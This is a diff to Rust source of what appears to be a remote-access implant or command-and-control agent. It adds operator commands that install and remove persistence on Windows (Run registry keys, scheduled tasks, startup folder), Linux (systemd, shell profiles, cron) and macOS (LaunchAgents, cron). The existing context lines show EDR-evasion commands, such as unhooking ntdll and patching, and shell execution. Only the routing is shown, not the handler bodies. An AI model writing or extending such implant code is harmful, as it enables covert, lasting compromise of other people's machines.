@@ -11,6 +11,7 @@ pub mod execution;
 pub mod files;
 pub mod process;
 pub mod lifecycle;
+pub mod persistence;
 
 use std::sync::{Arc, Mutex};
 use tokio::sync::mpsc;
@@ -165,6 +166,44 @@ async fn route(ctx: &HandlerContext, cmd: &str, req_id: u64) -> DispatchResult {
     if cmd == lc!("evasion:unhook_ntdll")  { return evasion::handle_unhook_ntdll(); }
     if cmd == lc!("evasion:patch_all")     { return evasion::handle_patch_all(); }
     if cmd == lc!("evasion:syscall_check") { return evasion::handle_syscall_check(); }
+
+    // ── Persistence ────────────────────────────────────────────────
+    if cmd == lc!("persist:list") { return persistence::handle_list(); }
+
+    // Windows
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_hklm_remove ")) { return persistence::handle_run_hklm_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_hklm "))        { return persistence::handle_run_hklm(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:run_remove "))      { return persistence::handle_run_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:run "))             { return persistence::handle_run(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:task_remove "))     { return persistence::handle_task_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:task "))            { return persistence::handle_task(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:startup_remove "))  { return persistence::handle_startup_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:startup "))         { return persistence::handle_startup(a); }
+
+    // Linux
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:systemd_remove "))  { return persistence::handle_systemd_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:systemd "))         { return persistence::handle_systemd(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:profile_remove "))  { return persistence::handle_profile_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:profile "))         { return persistence::handle_profile(a); }
+
+    // macOS
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:launchagent_remove ")) { return persistence::handle_launchagent_remove(a); }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:launchagent "))        { return persistence::handle_launchagent(a); }
+
+    // Cross-platform cron (Linux and macOS share the command name; platform
+    // dispatch happens inside the handler via cfg gates in mod.rs)
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:cron_remove ")) {
+        #[cfg(target_os = "linux")]   { return persistence::handle_cron_linux_remove(a); }
+        #[cfg(target_os = "macos")]   { return persistence::handle_cron_macos_remove(a); }
+        #[cfg(not(any(target_os = "linux", target_os = "macos")))]
+        return wrap_result(Err::<String, String>("persist:cron is Linux/macOS only".into()));
+    }
+    if let Some(a) = cmd.strip_prefix(&lc!("persist:cron ")) {
+        #[cfg(target_os = "linux")]   { return persistence::handle_cron_linux(a); }
+        #[cfg(target_os = "macos")]   { return persistence::handle_cron_macos(a); }
+        #[cfg(not(any(target_os = "linux", target_os = "macos")))]
+        return wrap_result(Err::<String, String>("persist:cron is Linux/macOS only".into()));
+    }
 
     // ── Execution (inmem, extensions, shell) ───────────────────────
     if let Some(shell_cmd) = cmd.strip_prefix(&lc!("bg ")) {
